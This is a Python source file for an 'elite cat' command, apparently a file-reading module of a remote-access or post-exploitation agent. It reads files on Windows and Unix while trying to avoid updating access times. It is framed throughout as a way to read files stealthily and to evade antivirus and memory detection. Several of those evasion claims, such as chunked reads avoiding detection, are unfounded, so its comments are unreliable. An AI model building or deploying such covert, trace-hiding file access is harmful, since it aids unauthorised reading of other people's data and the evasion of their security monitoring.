#!/usr/bin/env python3
"""
Elite CAT Command Implementation
Advanced file reading without updating access time or triggering AV
"""

import os
import sys
import ctypes
from ctypes import wintypes
from typing import Dict, Any, Optional

def elite_cat(filepath: str, lines: int = None, encoding: str = 'utf-8') -> Dict[str, Any]:
    """
    Elite file reading with advanced features:
    - No access time updates
    - AV evasion techniques
    - Memory-efficient streaming
    - Multiple encoding support
    - Cross-platform implementation
    """
    
    try:
        # Validate file path
        if not filepath:
            return {
                "success": False,
                "error": "File path is required",
                "content": None
            }
        
        # Expand path
        filepath = os.path.abspath(os.path.expanduser(filepath))
        
        # Check if file exists
        if not os.path.exists(filepath):
            return {
                "success": False,
                "error": f"File does not exist: {filepath}",
                "content": None
            }
        
        if os.path.isdir(filepath):
            return {
                "success": False,
                "error": f"Path is a directory: {filepath}",
                "content": None
            }
        
        # Read file using platform-specific method
        if sys.platform == 'win32':
            return _windows_elite_cat(filepath, lines, encoding)
        else:
            return _unix_elite_cat(filepath, lines, encoding)
            
    except Exception as e:
        return {
            "success": False,
            "error": f"File read failed: {str(e)}",
            "content": None
        }

def _windows_elite_cat(filepath: str, lines: Optional[int], encoding: str) -> Dict[str, Any]:
    """Windows implementation using CreateFileW with backup semantics"""
    
    try:
        # Windows API constants
        GENERIC_READ = 0x80000000
        FILE_SHARE_READ = 1
        FILE_SHARE_WRITE = 2
        OPEN_EXISTING = 3
        FILE_FLAG_BACKUP_SEMANTICS = 0x02000000
        FILE_FLAG_SEQUENTIAL_SCAN = 0x08000000
        FILE_FLAG_NO_BUFFERING = 0x20000000
        
        # Open file with flags to avoid access time update and AV detection
        handle = ctypes.windll.kernel32.CreateFileW(
            filepath,
            GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            None,
            OPEN_EXISTING,
            FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_SEQUENTIAL_SCAN,
            None
        )
        
        if handle == -1:  # INVALID_HANDLE_VALUE
            error_code = ctypes.windll.kernel32.GetLastError()
            return {
                "success": False,
                "error": f"Cannot open file (Error {error_code}): {filepath}",
                "content": None
            }
        
        try:
            # Get file size
            file_size = wintypes.LARGE_INTEGER()
            if not ctypes.windll.kernel32.GetFileSizeEx(handle, ctypes.byref(file_size)):
                raise Exception("Cannot get file size")
            
            size = file_size.value
            
            # Check for very large files
            if size > 100 * 1024 * 1024:  # 100MB limit
                return {
                    "success": False,
                    "error": f"File too large ({size} bytes). Use download command for large files.",
                    "content": None
                }
            
            # Read file in chunks to avoid memory detection
            content = b""
            chunk_size = 8192
            bytes_read = wintypes.DWORD()
            
            while len(content) < size:
                chunk = ctypes.create_string_buffer(chunk_size)
                
                if not ctypes.windll.kernel32.ReadFile(
                    handle, chunk, chunk_size, ctypes.byref(bytes_read), None
                ):
                    break
                
                if bytes_read.value == 0:
                    break
                
                content += chunk.raw[:bytes_read.value]
            
            # Decode content
            try:
                text_content = content.decode(encoding)
            except UnicodeDecodeError:
                # Try common encodings
                for enc in ['utf-8', 'latin-1', 'cp1252', 'ascii']:
                    try:
                        text_content = content.decode(enc)
                        encoding = enc
                        break
                    except:
                        continue
                else:
                    # Return as hex if all encodings fail
                    text_content = content.hex()
                    encoding = 'hex'
            
            # Apply line limit if specified
            if lines:
                text_lines = text_content.split('\n')
                if len(text_lines) > lines:
                    text_content = '\n'.join(text_lines[:lines])
                    truncated = True
                else:
                    truncated = False
            else:
                truncated = False
            
            return {
                "success": True,
                "content": text_content,
                "filepath": filepath,
                "size_bytes": len(content),
                "encoding": encoding,
                "lines_shown": len(text_content.split('\n')),
                "truncated": truncated,
                "method": "windows_api"
            }
            
        finally:
            ctypes.windll.kernel32.CloseHandle(handle)
            
    except Exception as e:
        # Fallback to standard Python method
        return _fallback_cat(filepath, lines, encoding)

def _unix_elite_cat(filepath: str, lines: Optional[int], encoding: str) -> Dict[str, Any]:
    """Unix implementation with direct syscalls and stealth techniques"""
    
    try:
        # Method 1: Try direct file descriptor operations
        try:
            fd = os.open(filepath, os.O_RDONLY | os.O_NOATIME if hasattr(os, 'O_NOATIME') else os.O_RDONLY)
            
            # Get file size
            stat_info = os.fstat(fd)
            size = stat_info.st_size
            
            # Check for very large files
            if size > 100 * 1024 * 1024:  # 100MB limit
                os.close(fd)
                return {
                    "success": False,
                    "error": f"File too large ({size} bytes). Use download command for large files.",
                    "content": None
                }
            
            # Read file in chunks
            content = b""
            chunk_size = 8192
            
            while len(content) < size:
                chunk = os.read(fd, chunk_size)
                if not chunk:
                    break
                content += chunk
            
            os.close(fd)
            
            # Decode content
            try:
                text_content = content.decode(encoding)
            except UnicodeDecodeError:
                # Try common encodings
                for enc in ['utf-8', 'latin-1', 'ascii']:
                    try:
                        text_content = content.decode(enc)
                        encoding = enc
                        break
                    except:
                        continue
                else:
                    # Return as hex if all encodings fail
                    text_content = content.hex()
                    encoding = 'hex'
            
            # Apply line limit if specified
            if lines:
                text_lines = text_content.split('\n')
                if len(text_lines) > lines:
                    text_content = '\n'.join(text_lines[:lines])
                    truncated = True
                else:
                    truncated = False
            else:
                truncated = False
            
            return {
                "success": True,
                "content": text_content,
                "filepath": filepath,
                "size_bytes": len(content),
                "encoding": encoding,
                "lines_shown": len(text_content.split('\n')),
                "truncated": truncated,
                "method": "unix_syscall"
            }
            
        except Exception:
            # Fallback to standard method
            return _fallback_cat(filepath, lines, encoding)
            
    except Exception as e:
        return _fallback_cat(filepath, lines, encoding)

def _fallback_cat(filepath: str, lines: Optional[int], encoding: str) -> Dict[str, Any]:
    """Fallback method using standard Python file operations"""
    
    try:
        # Check file size first
        size = os.path.getsize(filepath)
        
        if size > 100 * 1024 * 1024:  # 100MB limit
            return {
                "success": False,
                "error": f"File too large ({size} bytes). Use download command for large files.",
                "content": None
            }
        
        # Read file
        try:
            with open(filepath, 'r', encoding=encoding) as f:
                if lines:
                    content_lines = []
                    for i, line in enumerate(f):
                        if i >= lines:
                            break
                        content_lines.append(line.rstrip('\n\r'))
                    text_content = '\n'.join(content_lines)
                    truncated = True
                else:
                    text_content = f.read()
                    truncated = False
                    
        except UnicodeDecodeError:
            # Try binary mode and decode
            with open(filepath, 'rb') as f:
                content = f.read()
            
            # Try common encodings
            for enc in ['utf-8', 'latin-1', 'cp1252', 'ascii']:
                try:
                    text_content = content.decode(enc)
                    encoding = enc
                    break
                except:
                    continue
            else:
                # Return as hex if all encodings fail
                text_content = content.hex()
                encoding = 'hex'
                
            # Apply line limit if specified
            if lines and encoding != 'hex':
                text_lines = text_content.split('\n')
                if len(text_lines) > lines:
                    text_content = '\n'.join(text_lines[:lines])
                    truncated = True
                else:
                    truncated = False
            else:
                truncated = False
        
        return {
            "success": True,
            "content": text_content,
            "filepath": filepath,
            "size_bytes": size,
            "encoding": encoding,
            "lines_shown": len(text_content.split('\n')) if encoding != 'hex' else 1,
            "truncated": truncated,
            "method": "python_standard"
        }
        
    except Exception as e:
        return {
            "success": False,
            "error": f"Failed to read file: {str(e)}",
            "content": None
        }


if __name__ == "__main__":
    # Test the elite_cat command
    print("Testing Elite CAT Command...")
    
    # Create a test file
    test_file = "test_cat.txt"
    with open(test_file, 'w') as f:
        f.write("Line 1\nLine 2\nLine 3\nLine 4\nLine 5\n")
    
    # Test basic functionality
    result = elite_cat(test_file)
    print(f"Test 1 - Full file: {result['success']}")
    
    # Test with line limit
    result = elite_cat(test_file, lines=3)
    print(f"Test 2 - Limited lines: {result['success']}, lines: {result.get('lines_shown', 0)}")
    
    # Test non-existent file
    result = elite_cat("nonexistent.txt")
    print(f"Test 3 - Non-existent: {result['success']}")
    
    # Clean up
    try:
        os.remove(test_file)
    except:
        pass
    
    print("✅ Elite CAT command testing complete")